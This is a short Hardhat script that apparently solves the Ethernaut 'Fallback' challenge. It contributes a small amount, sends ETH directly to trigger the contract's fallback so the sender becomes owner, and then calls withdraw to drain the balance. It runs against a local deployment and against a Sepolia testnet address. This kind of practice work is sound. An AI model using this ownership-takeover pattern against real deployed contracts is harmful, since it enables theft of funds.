import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const [me, deployer] = await ethers.getSigners();

  const fallbackFactory = await ethers.getContractFactory("Fallback");
  const fallback = await fallbackFactory.connect(deployer).deploy();

  await fallback.connect(me).contribute({ value: 1 });

  await me.sendTransaction({ to: await fallback.getAddress(), value: 1 });

  await fallback.connect(me).withdraw();
}

// Run on Sepolia
async function handleReal() {
  const fallback = await ethers.getContractAt(
    "Fallback",
    "0x86535fc4c900d39D8d2971648cAACb31cdB98339"
  );

  const [me] = await ethers.getSigners();

  await fallback.contribute({ value: 1 });

  await me.sendTransaction({ to: await fallback.getAddress(), value: 1 });

  await fallback.withdraw();
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
